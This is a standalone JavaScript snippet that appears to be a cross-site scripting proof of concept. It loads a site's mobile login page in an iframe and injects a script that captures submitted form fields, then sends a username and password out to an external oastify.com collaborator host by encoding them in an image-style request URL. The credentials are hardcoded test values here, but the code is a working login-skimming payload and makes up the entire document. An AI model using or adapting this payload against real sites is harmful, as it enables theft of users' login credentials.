// Function to dynamically create the iframe and append it to the body
    function createIframe() {
        var iframe = document.createElement('iframe');
        iframe.src = "/account/login/mobile";
        iframe.id = "loginFrame";
        document.body.appendChild(iframe);
        return iframe;
    }

    var frame = createIframe();

    // Add load event listener to iframe to inject script after it loads
    frame.onload = function () {
        var doc = frame.contentDocument || frame.contentWindow.document;

        // Inject script to listen to form submission inside the iframe
        var script = doc.createElement('script');
        script.textContent = `
            function sendData(username, password) {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/USER' + encodeURIComponent(username) + 'PASS' + encodeURIComponent(password) + '.png', true);
                xhr.send();
            }

            document.body.addEventListener('submit', function(event) {
                if (event.target.tagName.toLowerCase() === 'form') {
                var formData = {};

                    // Iterate over all input elements in the form
                    var inputs = event.target.querySelectorAll('input');
                    inputs.forEach(function(input) {
                        // Assuming you want to ignore buttons and submit inputs
                        if (input.type !== 'submit' && input.type !== 'button') {
                            formData[input.name] = input.value; // Use the name attribute as the key
                        }
                    });
            
                    // Optionally handle other form elements like select or textarea
                    var selects = event.target.querySelectorAll('select');
                    selects.forEach(function(select) {
                        formData[select.name] = select.value;
                    });
            
                    var textareas = event.target.querySelectorAll('textarea');
                    textareas.forEach(function(textarea) {
                        formData[textarea.name] = textarea.value;
                    });
                    
                    //var username = document.getElementById('control').value;
                    //var password = document.getElementById('control').value;
                    var username = '123';
                    var password = '456';
                    alert(formData);
                    sendData(username, password);
                }
            });
        `;
        doc.body.appendChild(script);
    };
